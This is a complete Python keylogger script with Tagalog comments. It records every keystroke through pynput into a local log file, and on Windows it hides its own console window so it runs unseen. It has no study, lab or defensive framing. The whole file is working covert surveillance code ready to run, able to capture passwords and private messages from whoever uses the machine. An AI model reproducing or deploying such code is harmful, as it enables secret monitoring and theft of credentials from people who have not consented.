import ctypes
import os
import sys
from pynput import keyboard

# Itago ang console window kung tumatakbo sa Windows
if sys.platform == "win32":
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        hwnd = kernel32.GetConsoleWindow()
        if hwnd != 0:
            user32.ShowWindow(hwnd, 0) # 0 = SW_HIDE
    except Exception:
        pass

# Gumawa ng "log" folder kung hindi pa ito umiiral
LOG_DIR = "log"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Isang listahan para pansamantalang i-store ang mga type mo
current_typed_text = []

def on_press(key):
    global current_typed_text
    try:
        if key.char is not None:
            current_typed_text.append(key.char)
            save_to_file()
    except AttributeError:
        if key == keyboard.Key.space:
            current_typed_text.append(" ")
            save_to_file()
        elif key == keyboard.Key.enter:
            current_typed_text.append("\n")
            save_to_file()
        elif key == keyboard.Key.backspace:
            if len(current_typed_text) > 0:
                current_typed_text.pop()
            save_to_file()

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def save_to_file():
    # I-save ang file sa loob ng "log" folder
    file_path = os.path.join(LOG_DIR, "clean_key_log.txt")
    with open(file_path, "w", encoding="utf-8") as f:
        f.write("".join(current_typed_text))

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()